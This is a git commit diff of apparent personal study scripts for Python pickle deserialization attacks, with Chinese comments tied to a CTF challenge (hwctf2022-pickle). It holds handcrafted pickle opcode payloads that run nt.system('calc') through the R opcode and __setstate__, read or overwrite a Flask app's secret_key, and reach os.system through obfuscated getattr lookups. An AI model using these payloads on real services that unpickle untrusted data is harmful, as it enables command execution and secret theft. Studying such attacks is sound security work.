147aa2a2791c15339ad06b135be57f1da42f968d
lockcy <755718761@qq.com>
2022-10-06 14:23:20 +0800

    20221006

--- flask/b.py
+++ flask/b.py
@@ -1,39 +1,27 @@
-
 import pickle
-import pickletools
+import sys
+# import secret
+#
+# print("secret变量的值为:" + secret.secret_key)
+# opcode = b'''c__main__
+# secret
+# (S'secret_key'
+# S'Hack!!!'
+# db.'''
+# fake = pickle.loads(opcode)
+#
+# print("secret变量的值为:" + fake.secret_key)
 
-class Person:
-    def __init__(self, name, age=0):
-        self.name = name
-        self.age = age
+for i in sys.modules:
+    print(i)
 
-    def __str__(self):
-        return f"name: {self.name}\nage: {self.age}"
+import marshal
+import builtins
 
+a = getattr(builtins, "eval")
+print(a("2+2"))
 
-class Child(Person):
-    def __setstate__(self, state):
-        print("invoke __setstate__")
-        self.name =state
-        self.age =10
-
-    def __getstate__(self):
-        print("invoke __getstate__")
-        return "Child"
-
-
-c1 =Child("TEST")
-print(c1)
-# name: TEST
-# age: 0
-
-opcode =pickle.dumps(c1 ,protocol=0)
-print(opcode)
-# invoke __getstate__
-# b'ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.'
-
-c2 =pickle.loads(opcode)
-print(c2)
-# invoke __setstate__
-# name: Child
-# age: 10
+# print(getattr(sys.modules["os"], "system"))
+# print(getattr(sys.modules[chr(111)+"s"], "system"))
+# import nt
+# nt.system("calc")
--- flask/pickle_cover_variable.py
+++ flask/pickle_cover_variable.py
@@ -15,6 +15,7 @@ import os
 app = Flask(__name__)
 app.secret_key = secret.secret_key
 
+
 class User:
     def __init__(self, age=25, name="lockcy"):
         self.age = age
@@ -29,19 +30,37 @@ class User:
         time.sleep(2)
         print("end sleeping")
 
-    def __reduce__(self):
-        return (__import__("os").system,("calc",))
+    # def __reduce__(self):
+    #     return (__import__("os").system,("calc",))
+
 
 if __name__ == '__main__':
     user1 = User(1, "a")
     data = pickle.dumps(user1)
     print(data)
-    # evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
-    #        b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x03age\x94K\x19\x8c\x04name\x94\x8c\x06lockcy\x94ub.'
+    # 正常的序列化数据
+    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
+           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x03age\x94K\x19\x8c\x04name\x94\x8c\x06lockcy\x94ub.'
+    # R 命令字调用 __reduce__ 调用函数命令执行
     evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
            b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(' \
            b'\x8c\x03age\x94K\x19\x8c\x04name\x94\x8c\x06lockcy\x94ub' \
-           b'\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x940.'
-    # evil = b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'
+           b'\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x940.'
+    # 读取全局变量 app.secret_key，使 name 指向 secret_key (hwctf2022-pickle game)
+    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
+           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(' \
+           b'\x8c\x03age\x94K\x19\x8c\x04namecsecret\nsecret_key\nub.'
+
+    # 读取全局变量 app.secret_key，使 name 指向 secret_key (hwctf2022-pickle game)
+    evil = b'\x80\x04\x955\x00\x00\x00\x00\x00\x00\x00\x8c\x08' \
+           b'__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(' \
+           b'\x8c\x03age\x94K\x19\x8c\x04namecsecret\nsecret_key\nub' \
+           b'}(S"__\x73etstate__"\ncnt\nsystem\nubS"calc"\nb.'
+
+    # 覆盖全局变量 app.secret_key (hwctf2022-pickle game 非预期)
+    # evil = b'csecret\nsecret_key\n(S"secret_key"\nS"hack!"\ndb.'
     u = pickle.loads(evil)
+    # print(secret.secret_key)
+    # print(type(u))
     pickletools.dis(evil)
+
